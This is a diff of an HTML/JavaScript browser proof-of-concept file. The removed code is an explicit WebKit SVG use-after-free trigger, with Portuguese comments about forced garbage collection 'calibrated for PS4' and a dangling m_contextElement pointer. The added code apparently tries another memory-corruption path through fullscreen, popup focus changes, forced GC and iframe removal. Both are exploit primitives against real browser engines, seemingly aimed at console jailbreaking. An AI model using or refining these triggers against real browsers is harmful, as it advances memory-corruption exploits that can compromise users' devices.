@@ -1,51 +1,91 @@
+<html>
+<body><button id="run">Run Test</button>
+<div id="status">Iframe ready</div>
+<iframe id="testFrame" width="100" height="100"></iframe>
 <script>
     function gc() {
-    if (typeof GCController !== "undefined")
-        GCController.collect();
-    else {
-        var gcRec = function (n) {
-            if (n < 1)
-                return {};
-            var temp = {i: "ab" + i + (i / 100000)};
-            temp += "foo";
-            gcRec(n-1);
-        };
-        for (var i = 0; i < 1000; i++)
-            gcRec(10);
+    function gcRec(n) {
+        if (n < 1)
+            return {};
+        var temp = { i: "ab" + i + (i / 100000) };
+        temp += "foo";
+        gcRec(n - 1);
     }
-  }
-  
-onload = async () => {
-    let svg0 = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
-    let svgAnimatedLength = svg0.width;
-    let baseVal = svgAnimatedLength.baseVal;
-    let clipPath0 = document.createElementNS('http://www.w3.org/2000/svg', 'clipPath');
-    svg0.append(clipPath0);
-    clipPath0.append('');
-    await undefined;
-
-    // Canário antes de nular
-    let canary = new WeakRef(svg0);
-
-    svg0 = null;
-    svgAnimatedLength = null;
-    clipPath0 = null;
-
-    // GC calibrado pro PS4
-    await gc(); // ou o export do seu force-gc-ps4.js
-
-    // Diagnóstico: svg0 foi coletado?
-    if (canary.deref() !== undefined) {
-        document.body.innerHTML =
-            'FALHOU: svg0 NÃO foi coletado — m_contextElement ainda válido, UAF impossível.<br>' +
-            'Causa: referência adicional mantendo SVGSVGElement vivo.';
-        return;
+    for (var i = 0; i < 10000; i++)
+        gcRec(10);  
     }
+var iframe = document.getElementById("testFrame");
+var popup = null;
+var focusTimer = null;
 
-    // svg0 coletado → m_contextElement é raw pointer dangling
-    // baseVal ainda mantém SVGAnimatedLength vivo via RefPtr
-    document.body.innerHTML = 'svg0 coletado. Disparando UAF...';
-    baseVal.value = 0; // commitPropertyChange → m_contextElement->... → UAF
-    document.body.innerHTML = 'PASS if no crash';
+iframe.onload = function() {
+    var doc = iframe.contentDocument;
+    doc.open();
+    doc.write(
+        '<!DOCTYPE html>' +
+        '<html>' +
+        '<body>' +
+        '<h3>Iframe</h3>' +
+        '<div id="target" style="width:200px;height:150px;background:red"></div>' +
+        '</body>' +
+        '</html>'
+    );
+    doc.close();
 };
-</script>
+
+document.getElementById("run").onclick = function() {
+    var status = document.getElementById("status");
+
+    popup = window.open(
+        "",
+        "_blank",
+        "width=400,height=300"
+    );
+
+    popup.document.open();
+    popup.document.write(
+        '<!DOCTYPE html>' +
+        '<html>' +
+        '<body>' +
+        '<h3>Popup</h3>' +
+        '<p>Focus target</p>' +
+        '</body>' +
+        '</html>'
+    );
+    popup.document.close();
+
+    var frameDocument = iframe.contentDocument;
+    var fullscreenElement = frameDocument.documentElement;
+
+    if (fullscreenElement.webkitRequestFullscreen) {
+        fullscreenElement.webkitRequestFullscreen();
+    }
+    gc();
+    setTimeout(function() {
+
+        if (!popup || popup.closed)
+            return;
+        popup.focus();
+        window.focus();            
+        iframe.contentWindow.focus();               
+
+        setTimeout(function() {
+
+              if (popup && !popup.closed) {
+                  popup.close();
+              }
+              focusTimer = setInterval(function() {
+
+                  if (!popup || popup.closed) {
+                     clearInterval(focusTimer);
+                     iframe.remove();     
+                      iframe = null;
+                  }
+               }, 20);
+         }, 300);
+    }, 300);
+};
+
+
+</script></body>
+</html>
